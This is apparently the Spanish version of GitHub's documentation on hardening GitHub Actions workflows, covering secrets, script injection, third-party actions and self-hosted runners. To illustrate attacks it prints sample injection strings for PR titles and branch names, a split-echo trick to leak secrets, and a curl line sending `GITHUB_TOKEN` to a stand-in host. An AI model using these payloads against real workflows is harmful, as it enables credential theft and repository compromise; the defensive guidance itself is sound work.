---
title: Fortalecimiento de seguridad para GitHub Actions
shortTitle: Fortalecimiento de seguridad
intro: 'Buenas prácticas de seguridad para utilizar las características de las {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
---

{% data reusables.actions.enterprise-beta %}
{% data reusables.actions.enterprise-github-hosted-runners %}

## Resumen

Esta guía explica cómo configurar el fortalecimiento de seguridad para ciertas características de las {% data variables.product.prodname_actions %}. Si no estás familiarizado con los conceptos de las {% data variables.product.prodname_actions %}, consulta la sección "[Conceptos principales para GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)".

## Utilizar secretos

Los valores sensibles jamás deben almacenarse como texto simple e archivos de flujo de trabajo, sino más bien como secretos. Los [secretos](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) pueden configurarse a nivel de organización, repositorio o ambiente y te permiten almacenar información sensible en {% data variables.product.product_name %}.

Los secretos utilizan [Cajas selladas de libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) de manera que se cifran antes de llegar a {% data variables.product.product_name %}. Esto ocurre cuando el secreto se emite [utilizando la IU](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) o a través de la [API de REST](/rest/reference/actions#secrets). Este cifrado del lado del cliente ayuda a minimizar los riesgos relacionados con el registro accidental (por ejemplo, bitácoras de excepción y de solicitud, entre otras) dentro de la infraestructura de {% data variables.product.product_name %}. Una vez que se carga el secreto, {% data variables.product.product_name %} puede entonces descifrarlo para que se pueda inyectar en el tiempo de ejecución del flujo de trabajo.

Para ayudar a prevenir la divulgación accidental, {% data variables.product.product_name %} utiliza un mecanismo que intenta redactar cualquier secreto que aparezca en las bitácoras de ejecución. La redacción busca coincidencias exactas de cualquier secreto configurado, así como los cifrados comunes de los valores, tales como Base64. Sin embargo, ya que hay varias formas en las que se puede transformar el valor de un secreto, esta redacción no está garantizada. Como resultado, hay ciertos pasos proactivos y buenas prácticas que debes seguir para ayudarte a garantizar que se redacten los secretos, y para limitar otros riesgos asociados con ellos:

- **Nunca uses datos estructurados como un secreto**
    - Los datos estructurados pueden causar que la redacción de secretos dentro de las bitácoras falle, ya que la redacción depende ampliamente de encontrar una coincidencia exacta para el valor específico del secreto. Por ejemplo, no utilices un blob de JSON, XML, o YAML (o similares) para encapsular el valor de un secreto, ya que esto reduce significativamente la probablidad de que los secretos se redacten adecuadamente. En vez de esto, crea secretos individuales para cada valor sensible.
- **Registra todos los secretos que se utilizan dentro de los flujos de trabajo**
    - Si los secretos se utilizan para generar otro valor sensible dentro de un flujo de trabajo, este valor generado debe [registrarse como un secreto](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) formalmente para que se pueda redactar si llega a aparecer en las bitácoras. Por ejemplo, si utilizas una llave privada para generar un JWT firmado para acceder a una API web, asegúrate registrar este JWT como un secreto, de lo contrario, este no se redactará si es que llega a ingresar en la salida de la bitácora.
    - El registrar secretos aplica también a cualquier tipo de transformación/cifrado. Si tu secreto se transforma de alguna manera (como en el cifrado URL o de Base64), asegúrate de registrar el valor nuevo como un secreto también.
- **Audita cómo se manejan los secretos**
    - Audita cómo se utilizan los secretos para ayudarte a garantizar que se manejan como lo esperas. Puedes hacer esto si revisas el código fuente del rpositorio que ejecuta el flujo de trabajo y verificas cualquier acción que se utilice en dicho flujo de trabajo. Por ejemplo, verifica que no se estén enviando a hosts no deseados, o que no se estén imprimiendo explícitamente en la salida de una bitácora.
    - Visualiza las bitácoras de ejecución de tu flujo de trabajo después de probar las entradas válidas/no válidas y verifica que los secretos se redacten adecuadamente o que no se muestren. No siempre es obvio la forma en la que una herramienta o un comando que estés invocando enviará los errores a `STDOUT` o a `STDERR`, y los secretos pueden terminar siendo bitácoras de errores después. Por consiguiente, es una buena práctica el revisar manualmente las bitácoras de flujo de trabajo después de probar las entradas válidas y no válidas.
- **Utiliza credenciales que tengan alcances mínimos**
    - Asegúrate de que las credenciales que estás utilizando dentro de los flujos de trabajo tengan los menores privilegios requeridos y ten en mente que cualquier usuario con acceso de escritura en tu repositorio tiene acceso de lectura para todos los secretos que has configurado en éste.
    - Las acciones pueden utilizar el `GITHUB_TOKEN` si acceden a él desde el contexto `github.token`. Para obtener más información, consulta "[Contextos](/actions/learn-github-actions/contexts#github-context)". Por lo tanto, debes asegurarte de que se otorguen los permisos mínimos requeridos al `GITHUB_TOKEN`. Configurar el permiso predeterminado el `GITHUB_TOKEN` como acceso de solo lectura para el contenido de los repositorios, es una buena práctica de seguridad. Se puede incrementar los permisos, conforme se requiera, para los jobs individuales dentro del archivo de flujo de trabajo. Para obtener más información, consulta la sección "[Autenticación en un flujo de trabajo](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)".
- **Audita y rota los secretos registrados**
    - Revisa con frecuencia los secretos que se han registrado para confirmar que aún se requieran. Elimina aquellos que ya no se necesiten.
    - Rota los secretos con frecuencia para reducir la ventana de tiempo en la que un secreto puesto en riesgo es aún válido.
- **Considera requerir revisiones para el acceso a los secretos**
    - Puedes utilizar revisiones requeridas para proteger los secretos del ambiente. Un job del flujo de trabajo no podrá acceder a los secretos del ambiente hasta que el revisor otorgue la aprobación. Para obtener más información sobre cómo almacenar los secretos en los ambientes o cómo requerir las revisiones para estos, consulta las secciones "[Secretos cifrados](/actions/reference/encrypted-secrets)" y "[Utilizar ambientes para despliegue](/actions/deployment/using-environments-for-deployment)".

{% warning %}

**Advertencia**: Cualquier usuario con acceso de escritura a tu repositorio tiene acceso de lectura para todos los secretos que se configuraron en tu repositorio. Por lo tanto, debes asegurarte de que las credenciales que están utilizando con los flujos de trabajo tienen los mínimos privilegios requeridos.

{% endwarning %}

## Utilizar `CODEOWNERS` para monitorear cambios

Puedes utilizar la característica de `CODEOWNERS` para controlar la forma en la que se realizan los cambios en tus archivos de flujo de trabajo. Por ejemplo, si todos tus archivos de flujo de trabajo se almacenan en `.github/workflows`, puedes agregar este directorio a la lista de propietarios de código para que cualquier cambio propuesto a dichos archivos requiera primero de una aprobación del un revisor designado.

Para obtener más información, consulta "[Acerca de los propietarios del código](/github/creating-cloning-and-archiving-repositories/about-code-owners)."

## Entender el riesgo de las inyecciones de código

Cuando creas flujos de trabajo, [acciones personalizadas](/actions/creating-actions/about-actions) y [acciones compuestas](/actions/creating-actions/creating-a-composite-action), siempre debes considerar si tu código podría ejecutar una entrada no confiable de los atacantes. Esto puede ocurrir cuando un atacante agrega comandos y scripts malintencionados a un contexto. Cuando tu flujo de trabajo se ejecuta, estas secuencias podrían interpretarse como código que luego se ejecutará en el ejecutor.

 Los atacantes pueden agregar su propio código malintencionado al [contexto `github`](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), al cual se le debe tratar como una entrada potencialmente no confiable. Estos contextos pueden terminar habitualmente con `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, y `title`.  Por ejemplo: `github.event.issue.title`, o `github.event.pull_request.body`.

 Debes asegurarte de que estos valores no fluyan directamente hacia los flujos de trabajo, acciones, llamados a las API ni a cualquier otro lugar en donde se puedan itnerpretar como còdigo ejecutable. Cuando adoptas la misma postura de programaciòn defensiva que utilizaràs para cualquier otro còdigo de aplicaciones privilegiado, puedes ayudar a que la seguridad fortalezca tu uso de las {% data variables.product.prodname_actions %}. Para obtener màs informaciòn sobre algunos de los pasos que podrìa llevar a cabo un atacante, consulta la secciòn ["Impacto potencial de un ejecutor puesto en riesgo](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Adicionalmente, hay otras fuentes menos obvias de entradas no confiables, tales como los nombres de rama y las direcciones de correo electrònico, las cuales pueden ser bastante flexibles en cuestiòn de su contenido permitido. Por ejemplo, `zzz";echo${IFS}"hello";#` podrìa ser un nombre de rama vàlido y podrìa ser un vector de ataques potenciales para un repositorio objetivo.

Las siguientes secciones explican còmo puedes ayudar a mitigar el riesgo de inyecciòn de scripts.

### Ejemplo de un ataque de inyecciòn de scripts

Un ataque de inyecciòn de scripts puede ocurrir directamente dentro de un script dentro de las lìneas de un flujo de trabajo. En el siguiente ejemplo, una acciòn utiliza una expresiòn para probar la validez del tìtulo de una solicitud de cambios, pero tambièn agrega el riesgo de ocasionar una inyecciòn de scripts:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Este ejemplo es vulnerable a la inyecciòn de scripts ya que el comando `run` se ejecuta dentro de un script de un shell temporal en el ejecutor. Antes de que se ejecute el script, se evalùan las expresiones dentro de {% raw %}`${{ }}`{% endraw %} y luego se sustituyen con los valores resultantes, lo cual puede hacerlo vulnerable a la inyecciòn de comandos de shell.

Para inyectar comandos en este flujo de trabajo, el atacante podrìa crear una solicitud de cambios con un tìtulo de `a"; ls $GITHUB_WORKSPACE"`:

![Ejemplo de inyecciòn de scripts en el tìtulo de una solicitud de cambios](/assets/images/help/images/example-script-injection-pr-title.png)

En este ejemplo, el caracter `"` se utiliza para interrumpir la instrucciòn {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, permitiendo que se ejecute el comando `ls` en el ejecutor. Puedes ver la salida del comando `ls` en la bitàcora:

![Resultado de ejemplo de la inyecciòn de scripts](/assets/images/help/images/example-script-injection-result.png)

## Buenas pràcticas para mitigar los ataques de inyecciòn de scripts

Hay varios acercamientos diferentes disponibles para ayudarte a mitigar el riesgo de inyecciones de scripts:

### Utilizar una acciòn en vez de un script dentro de las lìneas (recomendado)

El acercamiento recomendado es crear una acciòn que procese el valor del contexto como un argumento. Este acercamiento no es vulnerable a los ataques de inyecciòn, ya que el valor del contexto no se utiliza para genrar un script de un shell, sino que se pasa a la acciòn como un argumento en vez de eso:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Utilizar una variable de ambiente intermedia

Para los scripts dentro de las lìneas, el acercamiento preferente para manejar las entradas no confiables es configurar el valor de la expresiòn en una variable de ambiente intermedia.

El siguiente ejemplo utiliza Bash para procesar el valor `github.event.pull_request.title` como una variable de ambiente:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

En este ejemplo, el script que se intenta inyectar no tuvo éxito:

![Ejemplo de inyección de script mitigada](/assets/images/help/images/example-script-injection-mitigated.png)

Con este enfoque, el valor de la expresón {% raw %}`${{ github.event.issue.title }}`{% endraw %} se almacena en la memoria y se utiliza como una variable y no interactúa con el proceso de generación del script. Adicionalmente, considera utilizar variables de cita doble del shell para evitar la [separación de palabras](https://github.com/koalaman/shellcheck/wiki/SC2086), pero esta es solo [una de muchas](https://mywiki.wooledge.org/BashPitfalls) recomendaciones generales para escribir scripts del shell y no es específica de {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Utilizar flujos de trabajo inicial para el escaneo de código

{% data reusables.advanced-security.starter-workflows-beta %}
El {% data variables.product.prodname_code_scanning_capc %} te permite encontrar vulnerabilidades de seguridad antes de que lleguen a producción. {% data variables.product.product_name %} proporciona flujos de trabajo iniciales para el {% data variables.product.prodname_code_scanning %}. Puedes utilizar estos flujos de trabajo sugeridos para construir tus flujos de trabajo del {% data variables.product.prodname_code_scanning %} en vez de comenzar desde cero. El flujo de trabajo de {% data variables.product.company_short%}, el {% data variables.product.prodname_codeql_workflow %}, funciona con {% data variables.product.prodname_codeql %}. También existen flujos de trabajo iniciales de terceros disponibles.

Para obtener más información, consulta las secciones "[Acerca del {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" y "[Configurar el {% data variables.product.prodname_code_scanning %} utilizando flujos de trabajo iniciales](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)".

{% endif %}

### Restringir los permisos para los tokens

Para ayudarte a mitigar el resigo de un token expuesto, considera restringir los permisos asignados. Para obtener màs informaciòn, consulta la secciòn "[Modificar los permisos para el GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)".

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}

## Utilizar OpenID connect para acceder a los recursos en la nube

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Utilizar acciones de terceros

Los jobs individuales en un flujo de trabajo pueden interactuar con (y ponerse enriesgo con) otros jobs. Por ejemplo, un job que consulta las variables de mabiente que se utilizan por otro job subsecuente, escribir archivos en un directorio compartido que el job subsecuente procesa, o aún de forma ás directa si interactúa con el conector de Docker e inspecciona a otros contenedores en ejecución y ejecuta comandos en ellos.

Esto significa que el poner en riesgo una sola acción dentro de un flujo de trabajo puede ser my significativo, ya que dicha acción en riesgo tendrá acceso a todos los secretos que configuras en tu repositorio, y podría utilizar el `GITHUB_TOKEN` para escribir en él. Por consiguiente, hay un riesgo significativo en suministrar acciones de repositorios de terceros en {% data variables.product.prodname_dotcom %}. Para obtener màs informaciòn sobre algunos de los pasos que podrìa llevar a cabo un atacante, consulta la secciòn ["Impacto potencial de un ejecutor puesto en riesgo](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Puedes ayudar a mitigar este riesgo si sigues estas buenas prácticas:

* **Fija las acciones a un SHA de confirmación de longitud completa**

  Fijar una acción a un SHA de confirmación de longitud completa es actualmente la única forma de utilizar una acción como un lanzamiento inmutable. Fijar las acciones a un SHA en particular ayuda a mitigar el riesgo de que un actor malinencionado agregue una puerta trasera al repositorio de la acción, ya que necesitarían generar una colisión de SHA-1 para una carga útil vlálida de un objeto de Git.

* **Audita el código fuente de la acción**

  Asegúrate de que la acción está manejando los secretos y el contenido de tu repositorio como se espera. Por ejemplo, verifica que los secretos no se envíen a hosts no deseados, o que no se registren inadvertidamente.

* **Fija las acciones a una etiqueta únicamente si confías en el creador**

  Aunque fijar el SHA de una confirmación es la opción más segura, especificar una etiqueta es más conveniente y se utiliza ampliamente. Si te gustaría especificar una etiqueta, entonces asegúrate de que confías en los creadores de la acción. La insignia de ‘Verified creator’ en {% data variables.product.prodname_marketplace %} es una señal útil, ya que te indica que la acción viene de un equipo cuya identidad verificó {% data variables.product.prodname_dotcom %}. Nota que este acercamiento sí tiene riesgos aún si confías en el autor, ya que una etiqueta se puede mover o borrar en caso de que un actor malicioso consiga acceso al repositorio que almacena la acción.

{% ifversion fpt or ghes > 3.3 or ghae-issue-4757 or ghec %}
## Reutilizar los flujos de trabajo de terceros

El mismo principio que se describió anteriormente para utilizar acciones de terceros también aplica para los flujos de trabajo de terceros. Puedes ayudar a mitigar los riesgos asociados con la reutilización de flujos de trabajo si sigues las mismas buenas prácticas que se describen anteriormente. Para obtener más información, consulta la sección "[Reutilizar flujos de trabajo](/actions/learn-github-actions/reusing-workflows)".
{% endif %}

{% ifversion internal-actions %}
## Permitir que los flujos de trabajo accedan a los repositorios internos

{% data reusables.actions.outside-collaborators-internal-actions %} Para obtener más información, consulta la sección "[Compartir acciones y flujos de trabajo con tu empresa](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)".
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Prevenir que {% data variables.product.prodname_actions %} {% ifversion allow-actions-to-approve-pr-with-ent-repo %}cree o {% endif %} apruebe solicitudes de cambio

{% data reusables.actions.workflow-pr-approval-permissions-intro %} El permitir que los flujos de trabajo, o cualquier otro tipo de automatización, {% ifversion allow-actions-to-approve-pr-with-ent-repo %}cree o {% endif %}apruebe solicitudes de cambios podría ser un riesgo de seguridad si la solicitud de cambios se fusiona sin una supervisión adecuada.

Para obtener más información sobre cómo configurar este ajuste, consulta las secciones {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Requerir políticas para {% data variables.product.prodname_actions %} en tu empresa](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Inhabilitar o limitar las {% data variables.product.prodname_actions %} en tu organización](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %} y "[Administrar los ajustes de {% data variables.product.prodname_actions %} en un repositorio](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
{% endif %}

## Utilizar las tarjetas de puntuación para asegurar los flujos de trabajo

[Las tarjetas de puntuación](https://github.com/ossf/scorecard) son una herramienta de seguridad automatizada que resalta las prácticas riesgosas en la cadena de suministro. Puedes utilizar la [Acción de tarjetas de puntuación](https://github.com/marketplace/actions/ossf-scorecard-action) y el [flujo de trabajo inicial](https://github.com/actions/starter-workflows) para seguir las mejores prácticas de seguridad. Una vez que se configure, la acción de tarjetas de puntuación se ejecutará automáticamente en los cambios de repositorio y alertará a los desarrolladores sobre las prácticas riesgosas en la cadena de suministro utilizando la experiencia de escaneo en el código integrado. El proyecto de tarjetas de puntuación ejecuta varias verificaciones, incluyendo las de ataques de inyección de scripts, permisos de tokens y acciones fijadas.

## Impacto potencial de un ejecutor puesto en riesgo

Estas secciones consideran algunos de los pasos que puede llevar a cabo un atacante si pueden ejecutar comandos malintencionados en un ejecutor de {% data variables.product.prodname_actions %}.

### Acceder a los secretos

Los flujos de trabajo que se activan utilizando el evento `pull_request` tienen permisos de solo lectura y no tienen acceso a los secretos. Sin embargo, estos permisos difieren de varios activadores de evento, tales como `issue_comment`, `issues` y `push`, en donde el atacante podrìa intentar robar secretos de repositorios o utilizar el permiso de escritura del [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) de un job.

- Si el token o secreto se configura como una variable de ambiente, puede accederse a èl directamente a travès del ambiente utilizando `printenv`.
- Si el secreto se utiliza dierctamente en una expresiòn, el script del shell que se generò se almacenarà en el disco y se podrà acceder al èl.
- En el caso de una acción eprsonalizada, el riesgo puede variar dependiendo de cómo un programa utiliza el secreto que obtuvo del argumento:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Aunque {% data variables.product.prodname_actions %} limpia los secretos de la memoria, los cuales no se referencien en el flujo de trabajo (o que no se incluyan en una acción), un atacante determinado podría cosechar tanto el `GITHUB_TOKEN` como cualquier secreto referenciado.

### Exfiltrar datos de un ejecutor

Un atacante puede exfiltrar cualquier secreto u otros datos robados del ejecutor. Para prevenir la divulgación accidental del secreto, {% data variables.product.prodname_actions %} [redacta automáticamente los secretos que se imprimen en la bitácora](/actions/reference/encrypted-secrets#accessing-your-secrets), pero este no es un límite de seguridad verdadero, ya que los secretos se pueden enviar intencionalmente a dicha bitácora. Por ejemplo, los secretos ofuscados pueden exfiltrarse utilizando `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Adicionalmente, ya que el atacante podría ejecutar comandos arbitrarios, podrían utilizar las solicitudes de tipo HTTP para enviar secretos u otros datos del repositorio a un servidor externo.

### Robar el `GITHUB_TOKEN` del job

Es posible que un atacante robe el `GITHUB_TOKEN` de un job. El ejecutor de {% data variables.product.prodname_actions %} recibe automáticamente un `GITHUB_TOKEN` generado con permisos que se limitan únicamente al repositorioq ue contiene el flujo de trabajo y el token vence después de que se complete el job. Una vez que se venza, el token ya no será útil para un atacante. Para solucionar esta limitante, pueden automatizar el ataque y llevarlo acabo en fracciones de segundo llamando a un servidor que controla un atacante con el token, por ejemplo: `a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`.

### Modificar el contenido de un repositorio

El servidor atacante puede utilizar la API de {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} para [modificar el contenido del repositorio](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) e incluir lanzamientos, en caso de que los permisos del `GITHUB_TOKEN` [no estén restringidos](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Considerar acceso entre repositorios

{% data variables.product.prodname_actions %} tiene el alcance intencional de un solo repositorio a la vez. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Los usuarios tienen permisos específicos para cada repositorio, así que, permitir que el `GITHUB_TOKEN` de un repositorio otorgue acceso a otro de ellos impactará el modelo de permisos de {% data variables.product.prodname_dotcom %} si no se implementa con cuidado. De forma similar, se debe tener cuidado al agregar tokens de autenticación de {% data variables.product.prodname_dotcom %} a un flujo de trabajo, ya que esto también puede afectar el modelo de permisos de {% data variables.product.prodname_dotcom %} al otorgar inadvertidamente un acceso amplio a los colaboradores.

Tenemos [un plan en el itinerario de {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) para compatibilizar un flujo que permita acceso entre repositorios dentro de {% data variables.product.product_name %}, pero aún no es una característica compatible. Actualmente, la única forma de realizar interacciones privilegiadas entre repositorios es colocar un token de autenticación de {% data variables.product.prodname_dotcom %} o llave SSH como un secreto dentro del flujo de trabajo. Ya que muchos tipos de tokens de autenticación no permiten el acceso granular a recursos específicos, existe un riesgo significativo en el utilizar el tipo incorrecto de token, ya que puede otorgr un acceso mucho más amplio que lo que se espera.

Esta lista describe los acercamientos recomendatos para acceder alos datos de un repositorio dentro de un flujo de trabjajo, en orden descendente de preferencia:

1. **El `GITHUB_TOKEN`**
    -  This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. El token se crea antes de que inicie cada job y caduca cuando dicho job finaliza. Para obtener más información, consulta "[Autenticar con el GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)".
    - El `GITHUB_TOKEN` debe utilizarse cada que sea posible.
2. **Llave de despliegue del repositorio**
    - Las llaves de despliegue son uno de los únicos tipos de credenciales que otorgan acceso de lectura o escritura en un solo repositorio, y pueden utilizarse para interactuar con otro repositorio dentro de un flujo de trabajo. Para obtener más información, consulta la sección "[Administrar las llaves de despliegue](/developers/overview/managing-deploy-keys#deploy-keys)".
    - Nota que las llaves de despliegue solo pueden clonarse y subirse al repositorio utilizando Git, y no pueden utilizarse para interactuar con las API de REST o de GraphQL, así que puede no sean adecuadas para tus necesidades.
3. **Tokens de {% data variables.product.prodname_github_app %}**
    - Las {% data variables.product.prodname_github_apps %} pueden instalarse en los repositorios seleccionados, e incluso tienen permisos granulares en los recursos dentro de ellos. Puedes crear una {% data variables.product.prodname_github_app %} interna a tu organización, instalarla en los repositorios a los que necesites tener acceso dentro de tu flujo de trabajo, y autenticarte como la instalación dentro del flujo de trabajo para acceder a esos repositorios.
4. **Tokens de acceso personal**
    - Jamás debes utilizar tokens de acceso personal desde tu propia cuenta. Estos token otorgan acceso a todos los repositorios dentro de las organizaciones a las cuales tienes acceso, así como a todos los repositorios personales de tu cuenta personal. Esto otorga indirectamente un acceso amplio a todos los usuarios con acceso de escritura en el repositorio en el cual está el flujo de trabajo. Adicionalmente, si sales de una organización más adelante, los flujos de trabajo que utilicen este token fallarán inmediatamente, y depurar este problema puede ser difícil.
    - Si se utiliza un token de acceso personal, debe ser uno que se haya generado para una cuenta nueva a la que solo se le haya otorgado acceso para los repositorios específicos que se requieren para el flujo de trabajo. Nota que este acercamiento no es escalable y debe evitarse para favorecer otras alternativas, tales como las llaves de despliegue.
5. **Llaves SSH en una cuenta personal**
    - Los flujos de trabajo jamás deben utilizar las llaves SSH en una cuenta personal. De forma similar a los tokens de acceso personal, estas otorgan permisos de lectura/escritura a todos tus repositorios personales así como a todos los repositorios a los que tengas acceso mediante la membercía de organización.  Esto otorga indirectamente un acceso amplio a todos los usuarios con acceso de escritura en el repositorio en el cual está el flujo de trabajo. Si pretendes utilizar una llave SSH porque solo necesitas llevar a cabo clonados de repositorio o subidas a éste, y no necesitas interactuar con una API pública, entonces mejor deberías utilizar llaves de despliegue individuales.

## Fortalecimiento para los ejecutores auto-hospedados

{% ifversion fpt or ghec %}
Los ejecutores **hospedados en {% data variables.product.prodname_dotcom %}** ejecutan código dentro de máquinas virtuales aisladas, limpias y efímeras, lo cual significa que no hay forma de poner este ambiente en riesgo de forma persistente, o de obtener acceso de otra forma a más información de la que se colocó en este ambiente durante el proceso de arranque.
{% endif %}

{% ifversion fpt or ghec %}Los ejecutores **auto-hospedados**{% elsif ghes or ghae %}Los ejecutores auto-hospedados{% endif %} para {% data variables.product.product_name %} no tienen garantías sobre ejecutar en máquinas virtuales limpias y efímeras y pueden ponerse en riesgo persistentemente mediante el código no confiable en un flujo de trabajo.

{% ifversion fpt or ghec %}Como resultado, los ejecutores auto-hospedados no deberán [utilizarse casi nunca para repositorios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories) en {% data variables.product.product_name %}, ya que cualquier usuario puede abrir solicitudes de extracción contra este repositorio y poner en riesgo el ambiente. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which, depending on its settings, can grant write access to the repository. Aunque los flujos de trabajo pueden controlar el acceso a los secretos de ambiente utilizando ambientes y revisiones requeridas, estos flujos de trabajo no se encuentran en un ambiente aislado y aún son susceptibles a los mismos riesgos cuando se ejecutan en un ejecutor auto-hospedado.

Cuando se define un ejecutor auto-hospedado a nivel de organización o de empresa, {% data variables.product.product_name %} puede programar flujos de trabajo de repositorios múltiples en el mismo ejecutor. Como consecuencia, si se pone en riesgo la seguridad de estos ambientes, se puede ocasionar un impacto amplio. Para ayudar a reducir el alcance de esta vulneración, puedes crear límites si organizas tus ejecutores auto-hospedados en grupos separados. Puedes restringir a qué {% ifversion restrict-groups-to-workflows %}flujos de trabajo, {% endif %}organizaciones y repositorios pueden acceder los grupos de ejecutores. Para obtener más información, consulta la sección "[Administrar el acceso a los ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)".

También deberás considerar el ambiente de las máquinas del ejecutor auto-hospedado:
- ¿Qué información sensible reside en la máquina configurada como el ejecutor auto-hospedado? Por ejemplo, llaves SSH privadas, tokens de acceso a la API, entre otros.
- ¿La máquina tiene acceso a la red para servicios sensibles? Por ejemplo, servicios de metadatos de Azure o de AWS. La cantidad de información sensible en este ambiente debe ser mínima, y siempre debes estar consciente de que cualquier usuario capaz de invocar flujos de trabajo tendrá acceso a este ambiente.

Algunos clientes podrían intentar mitigar estos riesgos parcialmente implementando sistemas que destruyan al ejecutor auto-hospedado automáticamente después de cada ejecución de un job. Sin embargo, este acercamiento podría no ser tan efectivo como se pretende, ya que no hay forma de garantizar que un ejecutor auto-hospedado ejecute solamente un job. Algunos trabajos utilizarán secretos como los argumentos de la línea de comandos, los cuales puede ver otro job que se esté ejecutando en el mismo ejecutor, tal como `ps x -w`. Esto puede causar fugas de secretos.

### Planear tu estrategia de administración para los ejecutores auto-hospedados

Un ejecutor auto-hospedado puede agregarse a varios niveles en tu jerarquía de {% data variables.product.prodname_dotcom %}: el nivel de empresa, organización o repositorio. Esta colocación determina quién podrá administrar el ejecutor:

**Administración centralizada:**
  - Si planeas que un equipo centralizado sea el propietario de los ejecutores auto-hospedados, entonces la recomendación es agregar tus ejecutores en el nivel de empresa u organización mutua más alto. Esto otorga a tu equipo una ubicación única para ver y administrar tus ejecutores.
  - Si solo tienes una organización sencilla, entonces el agregar tus ejecutores a nivel organizacional es efectivamente el mismo acercamiento, pero puede que encuentres dificultades si agregas otra organización en el futuro.

**Administración descentralizada:**
  - Si cada equipo administrará sus propios ejecutores auto-hospedados, entonces se recomienda agregarlos en el nivel más alto de propiedad del equipo. Por ejemplo, si cada equipo es dueño de su propia organización, entonces será más simple si los ejecutores se agregan a nivel de organización también.
  - También podrías agregar ejecutores a nivel de repositorio, pero esto agregará una sobrecarga de administración y también incrementará la cantidad de ejecutores que necesitas, ya que no puedes compartir ejecutores entre repositorios.

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}
### Autenticarte a tu proveedor en la nube

Si estás utilizando las {% data variables.product.prodname_actions %} para desplegar a un proveedor en la nube o si intentas utilizar HashiCorp Vault para la administración de secretos, entonces se recomienda que consideres utilizar OpenID Connect para crear tokens de acceso con un buen alcance y de vida corta para tus ejecuciones de flujo de trabajo. Para obtener más información, consulta la sección "[Acerca del fortalecimiento de seguridad con OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)".

{% endif %}

## Auditar eventos de {% data variables.product.prodname_actions %}

Puedes utilizar la bitácora de auditoría para monitorear las tareas administrativas en una organización. La bitácora de auditoría registra el tipo de acción, cuándo se ejecutó y qué cuenta personal la llevó a cabo.

